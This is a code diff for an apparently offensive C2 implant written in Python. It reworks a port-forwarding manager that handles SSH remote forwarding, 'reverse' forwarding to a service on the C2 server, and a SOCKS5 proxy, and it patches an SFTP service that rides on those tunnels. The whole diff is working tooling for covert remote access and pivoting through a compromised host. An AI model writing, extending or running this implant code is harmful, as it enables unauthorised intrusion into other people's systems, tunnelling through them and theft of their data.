@@ -32,19 +32,19 @@ class PortForwardingManager:
     def __init__(self, transport, channel):
         self.transport = transport
         self.channel = channel
-        self.remote_forward_threads = {}  # Remote-to-local forwarding
-        self.local_forward_threads = {}   # Local-to-remote forwarding
-        self.dynamic_threads = {}         # Dynamic SOCKS5 forwarding
+        # Now store (thread, stop_event) tuples
+        self.remote_forward_threads = {}  # port -> (thread, stop_event)
+        self.local_forward_threads = {}   # port -> (thread, stop_event)
+        self.dynamic_threads = {}         # port -> (thread, stop_event)
         self.running = True
 
     def start_remote_forwarding(self, remote_port: int, handler_factory: Callable) -> bool:
-        """
-        Start remote-to-local port forwarding with a custom channel handler
-        """
-        if remote_port in self.remote_forward_threads and self.remote_forward_threads[remote_port].is_alive():
-            self.channel.send(f"\r\nAlready forwarding remote port {remote_port}\r\n")
-            return True
-            
+        if remote_port in self.remote_forward_threads:
+            thread, stop_event = self.remote_forward_threads[remote_port]
+            if thread.is_alive():
+                self.channel.send(f"\r\nAlready forwarding remote port {remote_port}\r\n")
+                return True
+
         try:
             self.transport.request_port_forward('', remote_port)
             logging.info(f"Requested remote port forwarding on port {remote_port}")
@@ -54,40 +54,38 @@ class PortForwardingManager:
             self.channel.send(f"\r\nRemote port forwarding failed: {e}\r\n")
             return False
 
+        stop_event = threading.Event()
+
         def accept_forwarded():
-            port_running = True
-            while self.running and port_running:
+            while self.running and not stop_event.is_set():
                 try:
                     chan = self.transport.accept(1)
                     if not chan:
                         continue
-                    logging.info(f"Incoming forwarded-tcpip channel on remote port {remote_port}")
-                    
                     handler = handler_factory(chan)
                     t = threading.Thread(target=handler, daemon=True)
                     t.start()
                 except Exception as e:
                     logging.error(f"Error in forwarding thread: {e}")
                     time.sleep(1)
-            
             logging.info(f"Stopped accepting connections on remote port {remote_port}")
 
-        forward_thread = threading.Thread(target=accept_forwarded, daemon=True)
-        self.remote_forward_threads[remote_port] = forward_thread
-        forward_thread.start()
+        thread = threading.Thread(target=accept_forwarded, daemon=True)
+        self.remote_forward_threads[remote_port] = (thread, stop_event)
+        thread.start()
         return True
 
     def stop_remote_forwarding(self, remote_port: int) -> bool:
-        """Stop remote-to-local forwarding on the specified port"""
         if remote_port not in self.remote_forward_threads:
             self.channel.send(f"\r\nNo remote forwarding active on port {remote_port}\r\n")
             return True
-            
         try:
             self.transport.cancel_port_forward('', remote_port)
             self.channel.send(f"\r\nCancelled remote forwarding on port {remote_port}\r\n")
-            if self.remote_forward_threads[remote_port].is_alive():
-                self.remote_forward_threads[remote_port].join(2)
+            thread, stop_event = self.remote_forward_threads[remote_port]
+            stop_event.set()
+            if thread.is_alive():
+                thread.join(2)
             del self.remote_forward_threads[remote_port]
             return True
         except Exception as e:
@@ -95,104 +93,86 @@ class PortForwardingManager:
             self.channel.send(f"\r\nError cancelling remote port forward: {e}\r\n")
             return False
 
-    def start_local_forwarding(self, local_port: int, remote_host: str, remote_port: int) -> bool:
-        """Start local-to-remote port forwarding"""
-        if local_port in self.local_forward_threads and self.local_forward_threads[local_port].is_alive():
-            self.channel.send(f"\r\nAlready forwarding local port {local_port}\r\n")
-            return True
-            
+    def start_local_forwarding(self, server_port: int, c2_host: str, c2_port: int) -> bool:
+        """
+        Reverse port forwarding: Expose server_port on the C2 server, forward to c2_host:c2_port on the C2 server.
+        The implant will connect to the C2 server's port and get the service running there.
+        """
+        if server_port in self.local_forward_threads:
+            thread, stop_event = self.local_forward_threads[server_port]
+            if thread.is_alive():
+                self.channel.send(f"\r\nAlready reverse forwarding on port {server_port}\r\n")
+                return True
+
         try:
-            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            server_sock.bind(('127.0.0.1', local_port))
-            server_sock.listen(5)
-            server_sock.settimeout(1)
-            
-            logging.info(f"Started local port forwarding from {local_port} to {remote_host}:{remote_port}")
-            self.channel.send(f"\r\nLocal forwarding started: 127.0.0.1:{local_port} -> {remote_host}:{remote_port}\r\n")
+            self.transport.request_port_forward('', server_port)
+            self.channel.send(f"\r\nReverse forwarding started on server port {server_port}\r\n")
+            logging.info(f"Requested reverse port forward on server:{server_port} -> {c2_host}:{c2_port}")
         except Exception as e:
-            logging.error(f"Local port forward setup failed: {e}")
-            self.channel.send(f"\r\nLocal port forwarding failed: {e}\r\n")
+            logging.error(f"Reverse port forward request failed: {e}")
+            self.channel.send(f"\r\nReverse port forwarding failed: {e}\r\n")
             return False
 
-        def accept_local():
-            try:
-                while self.running:
-                    try:
-                        client_sock, addr = server_sock.accept()
-                        logging.info(f"Local connection from {addr[0]}:{addr[1]} to forward to {remote_host}:{remote_port}")
-                        
-                        transport_channel = self.transport.open_channel(
-                            'direct-tcpip',
-                            (remote_host, remote_port),
-                            addr
-                        )
-                        if transport_channel is None:
-                            logging.error("Channel creation failed")
-                            client_sock.close()
-                            continue
-                                
-                        threading.Thread(
-                            target=self._bidirectional_forward,
-                            args=(client_sock, transport_channel),
-                            daemon=True
-                        ).start()
-                    except socket.timeout:
-                        continue
-                    except Exception as e:
-                        logging.error(f"Error accepting connection: {e}")
-                        if not self.running:
-                            break
-                        time.sleep(1)
-            finally:
-                logging.info(f"Closing local forwarding on port {local_port}")
-                try:
-                    server_sock.close()
-                except:
-                    pass
+        stop_event = threading.Event()
 
-        forward_thread = threading.Thread(target=accept_local, daemon=True)
-        self.local_forward_threads[local_port] = forward_thread
-        forward_thread.start()
+        def accept_reverse():
+            while self.running and not stop_event.is_set():
+                try:
+                    chan = self.transport.accept(1)
+                    if not chan:
+                        continue
+                    logging.info(f"Incoming forwarded-tcpip channel for server port {server_port}")
+                    # Connect to the service on the C2 server (operator side)
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    try:
+                        sock.connect((c2_host, c2_port))
+                    except Exception as sock_err:
+                        logging.error(f"Could not connect to C2 service {c2_host}:{c2_port}: {sock_err}")
+                        chan.close()
+                        continue
+                    # Shuttle data between the SSH channel and the C2 service socket
+                    threading.Thread(target=self._bidirectional_forward, args=(chan, sock), daemon=True).start()
+                except Exception as e:
+                    logging.error(f"Error in reverse-forward accept loop: {e}")
+                    time.sleep(1)
+            logging.info(f"Stopped reverse forwarding on server port {server_port}")
+
+        thread = threading.Thread(target=accept_reverse, daemon=True)
+        self.local_forward_threads[server_port] = (thread, stop_event)
+        thread.start()
         return True
 
-    def stop_local_forwarding(self, local_port: int) -> bool:
-        """Stop local-to-remote forwarding on the specified port"""
-        if local_port not in self.local_forward_threads:
-            self.channel.send(f"\r\nNo local forwarding active on port {local_port}\r\n")
+    def stop_local_forwarding(self, remote_port: int) -> bool:
+        if remote_port not in self.local_forward_threads:
+            self.channel.send(f"\r\nNo reverse forwarding active on port {remote_port}\r\n")
             return True
-            
         try:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect(('127.0.0.1', local_port))
-                s.close()
-            except:
-                pass
-                
-            if self.local_forward_threads[local_port].is_alive():
-                self.local_forward_threads[local_port].join(2)
-            del self.local_forward_threads[local_port]
-            self.channel.send(f"\r\nStopped local forwarding on port {local_port}\r\n")
+            self.transport.cancel_port_forward('', remote_port)
+            thread, stop_event = self.local_forward_threads[remote_port]
+            stop_event.set()
+            if thread.is_alive():
+                thread.join(2)
+            del self.local_forward_threads[remote_port]
+            self.channel.send(f"\r\nStopped reverse forwarding on port {remote_port}\r\n")
             return True
         except Exception as e:
-            logging.error(f"Stop local port forward failed: {e}")
-            self.channel.send(f"\r\nError stopping local port forward: {e}\r\n")
+            logging.error(f"Stop reverse port forward failed: {e}")
+            self.channel.send(f"\r\nError stopping reverse port forward: {e}\r\n")
             return False
 
     def start_dynamic_forwarding(self, listen_port: int) -> bool:
-        """Start SOCKS5 proxy on the specified local port"""
-        if listen_port in self.dynamic_threads and self.dynamic_threads[listen_port].is_alive():
-            self.channel.send(f"\r\nSOCKS5 proxy already running on port {listen_port}\r\n")
-            return True
-            
+        if listen_port in self.dynamic_threads:
+            thread, stop_event = self.dynamic_threads[listen_port]
+            if thread.is_alive():
+                self.channel.send(f"\r\nSOCKS5 proxy already running on port {listen_port}\r\n")
+                return True
+
         try:
             server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server_sock.bind(('127.0.0.1', listen_port))
             server_sock.listen(5)
             server_sock.settimeout(1)
-            
             logging.info(f"Started SOCKS5 proxy on port {listen_port}")
             self.channel.send(f"\r\nSOCKS5 proxy started on 127.0.0.1:{listen_port}\r\n")
         except Exception as e:
@@ -200,13 +180,14 @@ class PortForwardingManager:
             self.channel.send(f"\r\nSOCKS5 proxy setup failed: {e}\r\n")
             return False
 
+        stop_event = threading.Event()
+
         def accept_socks():
             try:
-                while self.running:
+                while self.running and not stop_event.is_set():
                     try:
                         client_sock, addr = server_sock.accept()
                         logging.info(f"SOCKS connection from {addr[0]}:{addr[1]}")
-                        
                         threading.Thread(
                             target=self._handle_socks5_connection,
                             args=(client_sock,),
@@ -216,7 +197,7 @@ class PortForwardingManager:
                         continue
                     except Exception as e:
                         logging.error(f"Error accepting SOCKS connection: {e}")
-                        if not self.running:
+                        if not self.running or stop_event.is_set():
                             break
                         time.sleep(1)
             finally:
@@ -226,27 +207,26 @@ class PortForwardingManager:
                 except:
                     pass
 
-        socks_thread = threading.Thread(target=accept_socks, daemon=True)
-        self.dynamic_threads[listen_port] = socks_thread
-        socks_thread.start()
+        thread = threading.Thread(target=accept_socks, daemon=True)
+        self.dynamic_threads[listen_port] = (thread, stop_event)
+        thread.start()
         return True
 
     def stop_dynamic_forwarding(self, listen_port: int) -> bool:
-        """Stop SOCKS5 proxy on the specified port"""
         if listen_port not in self.dynamic_threads:
             self.channel.send(f"\r\nNo SOCKS5 proxy active on port {listen_port}\r\n")
             return True
-            
         try:
+            thread, stop_event = self.dynamic_threads[listen_port]
+            stop_event.set()
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect(('127.0.0.1', listen_port))
                 s.close()
             except:
                 pass
-                
-            if self.dynamic_threads[listen_port].is_alive():
-                self.dynamic_threads[listen_port].join(2)
+            if thread.is_alive():
+                thread.join(2)
             del self.dynamic_threads[listen_port]
             self.channel.send(f"\r\nStopped SOCKS5 proxy on port {listen_port}\r\n")
             return True
@@ -548,7 +528,8 @@ class SFTPService:
 
     def start_sftp_server(self, remote_port=3333):
         """Start SFTP server on the specified port"""
-        result = self.forwarder.start_forwarding(
+        # Use the correct method name from PortForwardingManager
+        result = self.forwarder.start_remote_forwarding(
             remote_port, 
             self.create_sftp_handler
         )
@@ -558,7 +539,8 @@ class SFTPService:
 
     def stop_sftp_server(self, remote_port=3333):
         """Stop SFTP server on the specified port"""
-        result = self.forwarder.stop_forwarding(remote_port)
+        # Use the correct method name from PortForwardingManager
+        result = self.forwarder.stop_remote_forwarding(remote_port)
         if result and remote_port in self.active_ports:
             self.active_ports.remove(remote_port)
         return result
@@ -568,7 +550,6 @@ class SFTPService:
         ports = list(self.active_ports)
         for port in ports:
             self.stop_sftp_server(port)
-
 
 class C2Client:
     def __init__(self, config: Dict[str, Any]):
